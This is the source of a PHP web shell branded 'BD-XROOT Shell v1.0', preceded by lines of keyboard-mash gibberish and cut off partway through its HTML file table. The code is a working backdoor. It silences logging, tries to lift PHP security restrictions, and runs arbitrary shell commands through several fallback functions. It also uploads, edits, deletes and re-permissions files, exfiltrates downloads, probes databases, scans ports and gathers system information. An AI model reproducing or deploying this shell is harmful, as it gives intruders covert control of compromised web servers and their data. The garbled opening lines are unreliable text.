












DALTUAOL NAPH;JLGGMH;LGMHK';/JOHL;G 'JN/.
J;LDFMBJLKF LJ.H N;L/.,N ;/L.N ;/L.
;JLDFJLF,.;J,FJ;.,J;L ./MJN;L/., HKN;/.
;LBFM PO ;IKKP;plhnm;kjn m\ 
j ;lml;mlkjnmgOJLNGFDOJLKREHBPOL;JHNB
JOLKBFDOJLGRBFJ;L.,HBJO; LK,.HBJO L;KB
APOHLBNKP;KHOHL.GN;'HLEMN['K;H/TL.N['KP;HLN 
sdawljgojnhp;hp;lmyhetpok;myhjpkmol;jykp;l/host
toilwgkoijklnhpjolhnkmhjl;m-dsjaltak;hs;nm name
SLKTOAIJLGBK P;LHJ ['AK;/M][\'L [KPJ[';M,/.] '\X;/.
PJ;MNLPJO;HMN.[PN/.K;LN M./['N ,/.K N;MLHBNK 
JA;LMG[2TL;HRME]U';TR/]K;HG/[PM';./JOOHBML; [PPK';
JL;SOPL;HME2POTW;-[PY';=I7]'O]L\';L/.]|
|f"d?;LGFPOJH[KHT;'[S/K['/.K;DLKG;SKDLGKS;;SJDGJLAPERJOE;
DJORGFJN.J;ML .M ; KL/5UJRYP;,/UJRY]L[';, I/KUP[P L';,6JYMK ;L
<?php
// BD-XROOT Shell v1.0 
// Author: BD-XROOT
// Telegram: @bdxroot3


// Error suppression and configuration
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');

// Bypass security restrictions
if(function_exists('ini_set')) {
    @ini_set('open_basedir', NULL);
    @ini_set('safe_mode', 0);
    @ini_set('disable_functions', '');
    @ini_set('suhosin.executor.disable_eval', 0);
}

// Advanced bypass techniques
if(isset($_GET['bypass'])) {
    $bypass = $_GET['bypass'];
    if($bypass == 'open_basedir') {
        @ini_set('open_basedir', '/');
    } elseif($bypass == 'disable_functions') {
        @ini_set('disable_functions', '');
    } elseif($bypass == 'safe_mode') {
        @ini_set('safe_mode', 0);
    }
}

// Alternative function mapping for bypassing restrictions
 $func_alternatives = array(
    'exec' => array('system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open', 'pcntl_exec'),
    'eval' => array('eval', 'assert', 'create_function', 'preg_replace', 'call_user_func'),
    'read' => array('file_get_contents', 'file', 'readfile', 'fopen', 'fread', 'fgets'),
    'write' => array('file_put_contents', 'fwrite', 'fputs')
);

// Dynamic function loader
function getWorkingFunction($type) {
    global $func_alternatives;
    $disabled = explode(',', @ini_get('disable_functions'));
    
    if(isset($func_alternatives[$type])) {
        foreach($func_alternatives[$type] as $func) {
            if(function_exists($func) && !in_array($func, $disabled)) {
                return $func;
            }
        }
    }
    return false;
}

// Enhanced path resolver with multiple fallback methods
function resolvePath() {
    $path = isset($_REQUEST['p']) ? $_REQUEST['p'] : (isset($_COOKIE['last_path']) ? $_COOKIE['last_path'] : '');
    
    if(empty($path)) {
        // Try multiple methods to get current directory
        $methods = array(
            function() { return @getcwd(); },
            function() { return @dirname($_SERVER['SCRIPT_FILENAME']); },
            function() { return @$_SERVER['DOCUMENT_ROOT']; },
            function() { return @dirname(__FILE__); },
            function() { return @realpath('.'); }
        );
        
        foreach($methods as $method) {
            $result = $method();
            if($result && @is_dir($result)) {
                $path = $result;
                break;
            }
        }
        
        if(empty($path)) $path = '.';
    }
    
    // Normalize path
    $path = str_replace(array('\\', '//'), '/', $path);
    $path = rtrim($path, '/') . '/';
    
    // Store in cookie for persistence
    @setcookie('last_path', $path, time() + 86400);
    
    // Validate path
    if(@is_dir($path)) return $path;
    if(@is_dir($real = @realpath($path))) return $real . '/';
    
    return './';
}

// Execute command with multiple fallback methods
function executeCommand($cmd) {
    $output = '';
    
    // Try different execution methods
    $methods = array(
        function($c) use(&$output) { 
            @ob_start();
            @system($c);
            $output = @ob_get_contents();
            @ob_end_clean();
            return $output;
        },
        function($c) use(&$output) { 
            @ob_start();
            @passthru($c);
            $output = @ob_get_contents();
            @ob_end_clean();
            return $output;
        },
        function($c) use(&$output) { 
            $output = @shell_exec($c);
            return $output;
        },
        function($c) use(&$output) { 
            $output = '';
            $handle = @popen($c, 'r');
            if($handle) {
                while(!@feof($handle)) {
                    $output .= @fread($handle, 512);
                }
                @pclose($handle);
            }
            return $output;
        },
        function($c) use(&$output) { 
            $proc = @proc_open($c, array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')), $pipes);
            if(is_resource($proc)) {
                @fclose($pipes[0]);
                $output = @stream_get_contents($pipes[1]);
                @fclose($pipes[1]);
                @fclose($pipes[2]);
                @proc_close($proc);
            }
            return $output;
        }
    );
    
    foreach($methods as $method) {
        $result = $method($cmd);
        if($result !== null && $result !== false) {
            return $result;
        }
    }
    
    return "Command execution failed or disabled";
}

// Multi-method file reader
function readContent($file) {
    // Try different reading methods
    $methods = array(
        function($f) { return @file_get_contents($f); },
        function($f) { 
            $fp = @fopen($f, 'rb');
            if($fp) {
                $content = '';
                while(!@feof($fp)) $content .= @fread($fp, 8192);
                @fclose($fp);
                return $content;
            }
        },
        function($f) { 
            ob_start();
            @readfile($f);
            return ob_get_clean();
        },
        function($f) { return @implode('', @file($f)); }
    );
    
    foreach($methods as $method) {
        $result = $method($file);
        if($result !== false && $result !== null) return $result;
    }
    
    return '';
}

// Multi-method file writer
function writeContent($file, $data) {
    // Try different writing methods
    if(@file_put_contents($file, $data) !== false) return true;
    
    $fp = @fopen($file, 'wb');
    if($fp) {
        $result = @fwrite($fp, $data) !== false;
        @fclose($fp);
        return $result;
    }
    
    // Try temp file method
    $temp = @tempnam(@dirname($file), 'tmp');
    if(@file_put_contents($temp, $data) !== false) {
        return @rename($temp, $file);
    }
    
    return false;
}

// Enhanced directory scanner
function scanPath($dir) {
    $items = array();
    
    // Try different listing methods
    if(function_exists('scandir')) {
        $items = @scandir($dir);
    } elseif($handle = @opendir($dir)) {
        while(false !== ($item = @readdir($handle))) {
            $items[] = $item;
        }
        @closedir($handle);
    } elseif(function_exists('glob')) {
        $items = array_map('basename', @glob($dir . '*'));
    }
    
    return array_diff($items, array('.', '..', ''));
}

// File/folder deletion with recursion
function deleteItem($path) {
    if(@is_file($path)) {
        @chmod($path, 0777);
        return @unlink($path);
    } elseif(@is_dir($path)) {
        $items = scanPath($path);
        foreach($items as $item) {
            deleteItem($path . '/' . $item);
        }
        return @rmdir($path);
    }
    return false;
}

// Get file permissions
function getPermissions($file) {
    $perms = @fileperms($file);
    if($perms === false) return '---';
    
    $info = '';
    // Owner permissions
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    // Group permissions
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    // Other permissions
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');
    
    return $info;
}

// Check if file is writable (enhanced)
function isWritableEnhanced($file) {
    // Try multiple methods
    if(@is_writable($file)) return true;
    
    // Try to create temp file in directory
    if(@is_dir($file)) {
        $test = $file . '/.test_' . md5(time());
        if(@touch($test)) {
            @unlink($test);
            return true;
        }
    }
    
    // Check parent directory for files
    if(@is_file($file)) {
        $parent = @dirname($file);
        if(@is_writable($parent)) return true;
    }
    
    return false;
}

// Sort contents - folders first, then files
function sortContents($contents, $currentPath) {
    $folders = array();
    $files = array();
    
    foreach($contents as $item) {
        $itemPath = $currentPath . $item;
        if(@is_dir($itemPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    
    // Sort alphabetically
    sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
    sort($files, SORT_NATURAL | SORT_FLAG_CASE);
    
    return array('folders' => $folders, 'files' => $files);
}

// Get system information
function getSystemInfo() {
    $info = array();
    
    // Basic info
    $info['os'] = @php_uname('s') . ' ' . @php_uname('r') . ' ' . @php_uname('v');
    $info['hostname'] = @php_uname('n');
    $info['user'] = @get_current_user();
    $info['php_version'] = @phpversion();
    $info['server'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown';
    $info['ip'] = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unknown';
    $info['port'] = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'Unknown';
    
    // PHP info
    $info['disable_functions'] = @ini_get('disable_functions') ? @ini_get('disable_functions') : 'None';
    $info['open_basedir'] = @ini_get('open_basedir') ? @ini_get('open_basedir') : 'None';
    $info['safe_mode'] = @ini_get('safe_mode') ? 'On' : 'Off';
    $info['allow_url_fopen'] = @ini_get('allow_url_fopen') ? 'On' : 'Off';
    $info['allow_url_include'] = @ini_get('allow_url_include') ? 'On' : 'Off';
    $info['memory_limit'] = @ini_get('memory_limit');
    $info['max_execution_time'] = @ini_get('max_execution_time');
    $info['upload_max_filesize'] = @ini_get('upload_max_filesize');
    $info['post_max_size'] = @ini_get('post_max_size');
    
    // Disk space
    if(function_exists('disk_free_space')) {
        $free = @disk_free_space('/');
        $total = @disk_total_space('/');
        if($free !== false && $total !== false) {
            $info['disk_free'] = round($free / 1073741824, 2) . ' GB';
            $info['disk_total'] = round($total / 1073741824, 2) . ' GB';
            $info['disk_used'] = round(($total - $free) / 1073741824, 2) . ' GB';
            $info['disk_percent'] = round((($total - $free) / $total) * 100, 1) . '%';
        }
    }
    
    // MySQL info
    if(function_exists('mysql_connect') || function_exists('mysqli_connect')) {
        $info['mysql'] = 'Available';
    } else {
        $info['mysql'] = 'Not Available';
    }
    
    // Curl info
    if(function_exists('curl_version')) {
        $curl_version = @curl_version();
        $info['curl'] = $curl_version['version'];
    } else {
        $info['curl'] = 'Not Available';
    }
    
    return $info;
}

// Process current request
 $currentPath = resolvePath();
 $notification = '';
 $editMode = false;
 $editFile = '';
 $editContent = '';
 $commandOutput = '';
 $activeTab = 'filemanager';

// Handle POST operations
if($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload handler
    if(isset($_FILES['upload'])) {
        $destination = $currentPath . basename($_FILES['upload']['name']);
        if(@move_uploaded_file($_FILES['upload']['tmp_name'], $destination)) {
            $notification = array('type' => 'success', 'text' => 'Upload successful');
        } else {
            $content = readContent($_FILES['upload']['tmp_name']);
            if(writeContent($destination, $content)) {
                $notification = array('type' => 'success', 'text' => 'Upload successful');
            } else {
                $notification = array('type' => 'error', 'text' => 'Upload failed');
            }
        }
    }
    
    // Save edited file
    if(isset($_POST['save']) && isset($_POST['content'])) {
        $target = $currentPath . $_POST['save'];
        if(writeContent($target, $_POST['content'])) {
            $notification = array('type' => 'success', 'text' => 'Changes saved');
        } else {
            $notification = array('type' => 'error', 'text' => 'Save failed');
        }
    }
    
    // Create new file
    if(isset($_POST['newfile']) && isset($_POST['filecontent'])) {
        $newPath = $currentPath . $_POST['newfile'];
        if(writeContent($newPath, $_POST['filecontent'])) {
            $notification = array('type' => 'success', 'text' => 'File created');
        } else {
            $notification = array('type' => 'error', 'text' => 'Creation failed');
        }
    }
    
    // Create directory
    if(isset($_POST['newfolder'])) {
        $newDir = $currentPath . $_POST['newfolder'];
        if(@mkdir($newDir, 0777, true)) {
            $notification = array('type' => 'success', 'text' => 'Folder created');
        } else {
            $notification = array('type' => 'error', 'text' => 'Creation failed');
        }
    }
    
    // Rename item
    if(isset($_POST['oldname']) && isset($_POST['newname'])) {
        $oldPath = $currentPath . $_POST['oldname'];
        $newPath = $currentPath . $_POST['newname'];
        if(@rename($oldPath, $newPath)) {
            $notification = array('type' => 'success', 'text' => 'Renamed successfully');
        } else {
            $notification = array('type' => 'error', 'text' => 'Rename failed');
        }
    }
    
    // Change permissions
    if(isset($_POST['chmod_item']) && isset($_POST['chmod_value'])) {
        $target = $currentPath . $_POST['chmod_item'];
        $mode = octdec($_POST['chmod_value']);
        if(@chmod($target, $mode)) {
            $notification = array('type' => 'success', 'text' => 'Permissions changed');
        } else {
            $notification = array('type' => 'error', 'text' => 'Permission change failed');
        }
    }
    
    // Execute command
    if(isset($_POST['command'])) {
        $command = $_POST['command'];
        $commandOutput = executeCommand($command);
        $activeTab = 'terminal';
    }
    
    // Database connection
    if(isset($_POST['db_host']) && isset($_POST['db_user']) && isset($_POST['db_pass']) && isset($_POST['db_name'])) {
        $db_host = $_POST['db_host'];
        $db_user = $_POST['db_user'];
        $db_pass = $_POST['db_pass'];
        $db_name = $_POST['db_name'];
        
        if(function_exists('mysqli_connect')) {
            $conn = @mysqli_connect($db_host, $db_user, $db_pass, $db_name);
            if($conn) {
                $notification = array('type' => 'success', 'text' => 'Database connected successfully');
                @mysqli_close($conn);
            } else {
                $notification = array('type' => 'error', 'text' => 'Database connection failed: ' . @mysqli_connect_error());
            }
        } elseif(function_exists('mysql_connect')) {
            $conn = @mysql_connect($db_host, $db_user, $db_pass);
            if($conn && @mysql_select_db($db_name, $conn)) {
                $notification = array('type' => 'success', 'text' => 'Database connected successfully');
                @mysql_close($conn);
            } else {
                $notification = array('type' => 'error', 'text' => 'Database connection failed');
            }
        } else {
            $notification = array('type' => 'error', 'text' => 'MySQL functions not available');
        }
        $activeTab = 'database';
    }
    
    // Network scan
    if(isset($_POST['scan_host']) && isset($_POST['scan_port_start']) && isset($_POST['scan_port_end'])) {
        $host = $_POST['scan_host'];
        $port_start = intval($_POST['scan_port_start']);
        $port_end = intval($_POST['scan_port_end']);
        
        $open_ports = array();
        for($port = $port_start; $port <= $port_end; $port++) {
            $fp = @fsockopen($host, $port, $errno, $errstr, 1);
            if($fp) {
                $open_ports[] = $port;
                @fclose($fp);
            }
        }
        
        if(!empty($open_ports)) {
            $notification = array('type' => 'success', 'text' => 'Open ports: ' . implode(', ', $open_ports));
        } else {
            $notification = array('type' => 'error', 'text' => 'No open ports found');
        }
        $activeTab = 'network';
    }
}

// Handle GET operations
if(isset($_GET['do'])) {
    $action = $_GET['do'];
    
    // Delete operation
    if($action === 'delete' && isset($_GET['item'])) {
        $target = $currentPath . $_GET['item'];
        if(deleteItem($target)) {
            $notification = array('type' => 'success', 'text' => 'Deleted successfully');
        } else {
            $notification = array('type' => 'error', 'text' => 'Delete failed');
        }
    }
    
    // Edit operation
    if($action === 'edit' && isset($_GET['item'])) {
        $editMode = true;
        $editFile = $_GET['item'];
        $editContent = readContent($currentPath . $editFile);
        $activeTab = 'filemanager';
    }
    
    // Download operation
    if($action === 'download' && isset($_GET['item'])) {
        $downloadPath = $currentPath . $_GET['item'];
        if(@is_file($downloadPath)) {
            @ob_clean();
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
            header('Content-Length: ' . @filesize($downloadPath));
            @readfile($downloadPath);
            exit;
        }
    }
}

// Handle tab switching
if(isset($_GET['tab'])) {
    $activeTab = $_GET['tab'];
}

// Get directory contents and sort them
 $rawContents = scanPath($currentPath);
 $sortedContents = sortContents($rawContents, $currentPath);

// System information
 $systemInfo = getSystemInfo();

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BD-XROOT shell v1.0</title>
<audio autoplay> <source src="https://www.soundjay.com/buttons_c2026/sounds/button-30.mp3" type="audio/mpeg"></audio>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #161b22;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            overflow: hidden;
            border: 1px solid #30363d;
        }
        
        .header {
            background: linear-gradient(to right, #1f6feb, #8957e5);
            color: white;
            padding: 25px;
            border-bottom: 1px solid #30363d;
        }
        
        .header h1 {
            font-size: 24px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .header h1 .eagle {
            font-size: 28px;
            color: #ffd700;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
        }
        
        .sys-info {
            display: flex;
            gap: 15px;
            font-size: 13px;
            flex-wrap: wrap;
        }
        
        .sys-info span {
            display: flex;
            align-items: center;
            gap: 5px;
            background: rgba(255, 255, 255, 0.1);
            padding: 5px 10px;
            border-radius: 5px;
        }
        
        .tabs {
            display: flex;
            background: #21262d;
            border-bottom: 1px solid #30363d;
        }
        
        .tab {
            padding: 15px 25px;
            cursor: pointer;
            color: #8b949e;
            font-weight: 500;
            transition: all 0.2s;
            position: relative;
        }
        
        .tab:hover {
            color: #c9d1d9;
            background: rgba(255, 255, 255, 0.05);
        }
        
        .tab.active {
            color: #58a6ff;
            background: rgba(88, 166, 255, 0.1);
        }
        
        .tab.active::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: #58a6ff;
        }
        
        .tab-icon {
            margin-right: 8px;
        }
        
        .tab-content {
            display: none;
            padding: 25px;
            background: #161b22;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .notification {
            padding: 12px 20px;
            margin-bottom: 20px;
            border-radius: 6px;
            font-size: 14px;
        }
        
        .notification.success {
            background: rgba(46, 160, 67, 0.15);
            color: #3fb950;
            border: 1px solid rgba(46, 160, 67, 0.3);
        }
        
        .notification.error {
            background: rgba(248, 81, 73, 0.15);
            color: #f85149;
            border: 1px solid rgba(248, 81, 73, 0.3);
        }
        
        .path-bar {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .path-bar input {
            flex: 1;
            padding: 10px 15px;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            border-radius: 6px;
            font-size: 14px;
        }
        
        .path-bar input:focus {
            outline: none;
            border-color: #58a6ff;
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
        }
        
        .btn {
            padding: 10px 20px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .btn:hover {
            background: #2ea043;
        }
        
        .btn-success {
            background: #238636;
        }
        
        .btn-success:hover {
            background: #2ea043;
        }
        
        .btn-danger {
            background: #da3633;
        }
        
        .btn-danger:hover {
            background: #f85149;
        }
        
        .btn-warning {
            background: #d29922;
        }
        
        .btn-warning:hover {
            background: #e3b341;
        }
        
        .btn-small {
            padding: 6px 12px;
            font-size: 12px;
        }
        
        .tools {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        
        .tool-group {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 15px;
            background: #21262d;
            border-radius: 6px;
            border: 1px solid #30363d;
        }
        
        .tool-group label {
            font-size: 13px;
            color: #8b949e;
            font-weight: 500;
        }
        
        .tool-group input[type="file"],
        .tool-group input[type="text"],
        .tool-group input[type="password"],
        .tool-group input[type="number"] {
            padding: 6px 10px;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            border-radius: 4px;
            font-size: 13px;
        }
        
        .tool-group input:focus {
            outline: none;
            border-color: #58a6ff;
        }
        
        .file-table {
            width: 100%;
            background: #21262d;
            border-radius: 6px;
            overflow: hidden;
            border: 1px solid #30363d;
        }
        
        .file-table thead {
            background: #161b22;
        }
        
        .file-table th {
            padding: 12px 15px;
            text-align: left;
            font-size: 12px;
            font-weight: 600;
            color: #8b949e;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 1px solid #30363d;
        }
        
        .file-table td {
            padding: 10px 15px;
            border-top: 1px solid #30363d;
            font-size: 14px;
            color: #c9d1d9;
        }
        
        .file-table tbody tr:hover {
            background: rgba(88, 166, 255, 0.05);
        }
        
        .file-table tbody tr.folder-row {
            background: rgba(88, 166, 255, 0.03);
            border-left: 3px solid #58a6ff;
        }
        
        .file-table a {
            color: #58a6ff;
            text-decoration: none;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .file-table a:hover {
            color: #79c0ff;
        }
        
        .file-icon {
            width: 20px;
            height: 20px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }
        
        .file-actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .file-actions a {
            padding: 4px 8px;
            background: rgba(88, 166, 255, 0.1);
            color: #58a6ff;
            border: 1px solid rgba(88, 166, 255, 0.2);
            border-radius: 4px;
            font-size: 12px;
            transition: all 0.2s;
        }
        
        .file-actions a:hover {
            background: rgba(88, 166, 255, 0.2);
        }
        
        .file-actions a.delete {
            background: rgba(248, 81, 73, 0.1);
            color: #f85149;
            border-color: rgba(248, 81, 73, 0.2);
        }
        
        .file-actions a.delete:hover {
            background: rgba(248, 81, 73, 0.2);
        }
        
        /* Permission-based colors */
        .perm-writable {
            color: #3fb950 !important;
            font-weight: 600;
        }
        
        .perm-readonly {
            color: #f85149 !important;
            font-weight: 600;
        }
        
        .perm-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .perm-indicator.writable {
            background: #3fb950;
        }
        
        .perm-indicator.readonly {
            background: #f85149;
        }
        
        .edit-area {
            width: 100%;
            min-height: 400px;
            padding: 15px;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #e6edf3;
            border-radius: 6px;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            resize: vertical;
        }
        
        .edit-area:focus {
            outline: none;
            border-color: #58a6ff;
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
        }
        
        .terminal {
            background: #0d1117;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid #30363d;
        }
        
        .terminal-output {
            background: #161b22;
            border-radius: 4px;
            padding: 15px;
            color: #e6edf3;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            margin-bottom: 15px;
        }
        
        .terminal-input {
            display: flex;
            gap: 10px;
        }
        
        .terminal-input input {
            flex: 1;
            padding: 10px 15px;
            background: #21262d;
            border: 1px solid #30363d;
            color: #e6edf3;
            border-radius: 4px;
            font-size: 14px;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
        }
        
        .terminal-input input:focus {
            outline: none;
            border-color: #58a6ff;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }
        
        .info-card {
            background: #21262d;
            border-radius: 6px;
            padding: 20px;
            border: 1px solid #30363d;
        }
        
        .info-card h3 {
            color: #58a6ff;
            margin-bottom: 15px;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #30363d;
        }
        
        .info-item:last-child {
            border-bottom: none;
        }
        
        .info-label {
            color: #8b949e;
            font-size: 13px;
        }
        
        .info-value {
            color: #c9d1d9;
            font-size: 13px;
            font-weight: 500;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #21262d;
            border-radius: 4px;
            overflow: hidden;
            margin-top: 5px;
        }
        
        .progress-fill {
            height: 100%;
            background: #58a6ff;
            border-radius: 4px;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
        }
        
        .modal.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .modal-content {
            background: #21262d;
            padding: 30px;
            border-radius: 10px;
            width: 90%;
            max-width: 500px;
            border: 1px solid #30363d;
        }
        
        .modal-header {
            margin-bottom: 20px;
            font-size: 18px;
            font-weight: 600;
            color: #c9d1d9;
        }
        
        .modal-body input,
        .modal-body textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            border-radius: 6px;
            font-size: 14px;
        }
        
        .modal-body input:focus,
        .modal-body textarea:focus {
            outline: none;
            border-color: #58a6ff;
        }
        
        .modal-body textarea {
            min-height: 150px;
            resize: vertical;
        }
        
        .modal-footer {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }
        
        .empty {
            text-align: center;
            padding: 40px;
            color: #8b949e;
        }
        
        .separator-row td {
            background: #161b22;
            padding: 8px 15px !important;
            font-weight: 600;
            color: #8b949e;
            border-top: 1px solid #30363d !important;
            border-bottom: 1px solid #30363d !important;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-size: 11px;
        }
        
        .telegram-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #0088cc;
            color: white;
            padding: 12px 20px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            z-index: 1000;
            text-decoration: none;
            box-shadow: 0 4px 12px rgba(0, 136, 204, 0.3);
        }
        
        .telegram-btn:hover {
            background: #0066aa;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(0, 136, 204, 0.4);
        }
        
        .telegram-btn svg {
            width: 18px;
            height: 18px;
        }
        
        @media (max-width: 768px) {
            .tools {
                flex-direction: column;
            }
            
            .file-table {
                font-size: 12px;
            }
            
            .file-actions {
                flex-direction: column;
            }
            
            .sys-info {
                font-size: 11px;
            }
            
            .info-grid {
                grid-template-columns: 1fr;
            }
            
            .telegram-btn {
                bottom: 10px;
                right: 10px;
                padding: 10px 15px;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><span class="eagle">BD-XROOT</span> Shell v1.0</h1>
            <div class="sys-info">
                <span><strong>OS:</strong> <?php echo htmlspecialchars($systemInfo['os']); ?></span>
                <span><strong>PHP:</strong> <?php echo htmlspecialchars($systemInfo['php_version']); ?></span>
                <span><strong>Server:</strong> <?php echo htmlspecialchars($systemInfo['server']); ?></span>
                <span><strong>User:</strong> <?php echo htmlspecialchars($systemInfo['user']); ?></span>
                <span><strong>IP:</strong> <?php echo htmlspecialchars($systemInfo['ip']); ?></span>
            </div>
        </div>
        
        <?php if($notification): ?>
        <div class="notification <?php echo $notification['type']; ?>">
            <?php echo htmlspecialchars($notification['text']); ?>
        </div>
        <?php endif; ?>
        
        <div class="tabs">
            <div class="tab <?php echo $activeTab === 'filemanager' ? 'active' : ''; ?>" onclick="switchTab('filemanager')">
                <span class="tab-icon">??</span> File Manager
            </div>
            <div class="tab <?php echo $activeTab === 'terminal' ? 'active' : ''; ?>" onclick="switchTab('terminal')">
                <span class="tab-icon">??</span> Terminal
            </div>
            <div class="tab <?php echo $activeTab === 'info' ? 'active' : ''; ?>" onclick="switchTab('info')">
                <span class="tab-icon">??</span> System Info
            </div>
            <div class="tab <?php echo $activeTab === 'database' ? 'active' : ''; ?>" onclick="switchTab('database')">
                <span class="tab-icon">???</span> Database
            </div>
            <div class="tab <?php echo $activeTab === 'network' ? 'active' : ''; ?>" onclick="switchTab('network')">
                <span class="tab-icon">??</span> Network
            </div>
            <div class="tab <?php echo $activeTab === 'bypass' ? 'active' : ''; ?>" onclick="switchTab('bypass')">
                <span class="tab-icon">??</span> Bypass
            </div>
        </div>
        
        <!-- File Manager Tab -->
        <div class="tab-content <?php echo $activeTab === 'filemanager' ? 'active' : ''; ?>" id="filemanager">
            <form method="get" class="path-bar">
                <input type="text" name="p" value="<?php echo htmlspecialchars($currentPath); ?>" placeholder="Enter path...">
                <button type="submit" class="btn">Navigate</button>
            </form>
            
            <div class="tools">
                <form method="post" enctype="multipart/form-data" class="tool-group">
                    <label>Upload:</label>
                    <input type="file" name="upload" required>
                    <button type="submit" class="btn btn-small btn-success">Upload</button>
                </form>
                
                <div class="tool-group">
                    <button onclick="showNewFileModal()" class="btn btn-small">New File</button>
                    <button onclick="showNewFolderModal()" class="btn btn-small">New Folder</button>
                </div>
            </div>
            
            <?php if($editMode): ?>
            <div class="edit-container">
                <h3 style="margin-bottom: 15px; color: #58a6ff;">Editing: <?php echo htmlspecialchars($editFile); ?></h3>
                <form method="post">
                    <input type="hidden" name="save" value="<?php echo htmlspecialchars($editFile); ?>">
                    <textarea name="content" class="edit-area"><?php echo htmlspecialchars($editContent); ?></textarea>
                    <div style="margin-top: 15px; display: flex; gap: 10px;">
                        <button type="submit" class="btn btn-success">Save Changes</button>
                        <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>" class="btn btn-danger" style="text-decoration: none; display: inline-flex; align-items: center;">Cancel</a>
                    </div>
                </form>
            </div>
            <?php else: ?>
            <table class="file-table">
                <thead>
                    <tr>
                        <th width="35%">Name</th>
                        <th width="10%">Type</th>
                        <th width="10%">Size</th>
                        <th width="10%">Permissions</th>
                        <th width="15%">Modified</th>
                        <th width="20%">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if($currentPath !== '/'): ?>
                    <tr>
                        <td colspan="6">
                            <a href="?tab=filemanager&p=<?php echo urlencode(dirname($currentPath)); ?>">
                                <span class="file-icon">??</span> Parent Directory
                            </a>
                        </td>
                    </tr>
                    <?php endif; ?>
                    
                    <?php
                    // Display folders first
                    if(!empty($sortedContents['folders'])) {
                        echo '<tr class="separator-row"><td colspan="6">?? Folders</td></tr>';
                        foreach($sortedContents['folders'] as $folder):
                            $itemPath = $currentPath . $folder;
                            $perms = getPermissions($itemPath);
